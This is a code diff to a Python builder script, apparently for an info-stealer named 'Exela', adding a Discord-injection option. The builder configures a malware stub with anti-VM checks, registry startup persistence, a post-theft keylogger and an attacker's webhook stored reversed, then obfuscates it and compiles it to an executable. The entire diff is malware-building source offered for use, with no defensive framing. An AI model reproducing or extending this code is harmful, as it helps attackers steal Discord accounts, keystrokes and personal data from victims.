@@ -9,6 +9,7 @@ class Build:
         self.startup = "false"
         self.startupMethod = "regedit"
         self.antivmorospusu = "true"
+        self.inject_dc = "false"
         self.compileToExe()
     def compileToExe(self):
         try:
@@ -39,6 +40,11 @@ class Build:
                     self.startupMethod = None
             else:self.startup= "false"
             os.system("cls")
+            getInjectioReq = str(input("yes/no\nDiscord injection : "))
+            if getInjectioReq.lower() == "y" or getInjectioReq.lower() == "yes":
+                self.inject_dc = "true"
+            else:
+                self.inject_dc = "false"
             getKeyloggerReq = str(input('Yes/no\nafter stealing process do u want to inject keylogger : '))
             if getKeyloggerReq.lower() == "y" or getKeyloggerReq.lower() == "yes":
                 self.injectKeylogger = '%keyloggertrue%'
@@ -59,7 +65,7 @@ class Build:
             else:self.pyinstallerCommand += "Obfuscated.py"
             with open("Exela.py", "r", encoding="utf-8", errors="ignore") as f:
                 readedCode = f.read()
-            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu).replace("%StartuP%", self.startup).replace("%MethoD%", self.startupMethod).replace('%keyloggerinject???%', self.injectKeylogger)
+            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu).replace("%StartuP%", self.startup).replace("%MethoD%", self.startupMethod).replace("%Inject_discord%", self.inject_dc).replace('%keyloggerinject???%', self.injectKeylogger)
             with open("stub.py", "w", encoding="utf-8", errors="ignore") as x:
                 x.write(replacedCode)
             self.obfuscateFile()
